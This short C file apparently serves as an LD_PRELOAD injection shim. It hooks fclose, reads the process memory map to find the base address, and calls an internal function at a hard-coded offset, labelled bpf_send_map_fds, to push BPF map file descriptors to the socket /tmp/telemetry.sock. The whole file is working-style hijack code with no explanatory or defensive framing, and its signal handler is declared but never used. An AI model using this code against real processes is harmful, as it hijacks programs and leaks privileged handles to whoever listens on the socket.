#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <signal.h>
#include <ucontext.h>

void sig_handler(int signo, siginfo_t *info, void *context) {
    ucontext_t *uc = (ucontext_t *)context;
    unsigned char *rip = (unsigned char *)uc->uc_mcontext.gregs[REG_RIP];
    printf("Segfault at RIP: %p\n", rip);
    exit(1);
}

int fclose(FILE *stream) {
    int (*orig_fclose)(FILE *) = dlsym(RTLD_NEXT, "fclose");
    static int called = 0;
    if (!called) {
        called = 1;

        FILE *f = fopen("/proc/self/maps", "r");
        char buf[1024];
        fgets(buf, sizeof(buf), f);
        fclose(f);

        unsigned long base;
        sscanf(buf, "%lx-", &base);
        printf("Base address: %lx\n", base);

        void (*bpf_send_map_fds)(const char*) = (void (*)(const char*))(base + 0x7e540);
        printf("Hook triggered on fclose! Calling bpf_send_map_fds at %p...\n", bpf_send_map_fds);
        bpf_send_map_fds("/tmp/telemetry.sock");
    }
    return orig_fclose(stream);
}
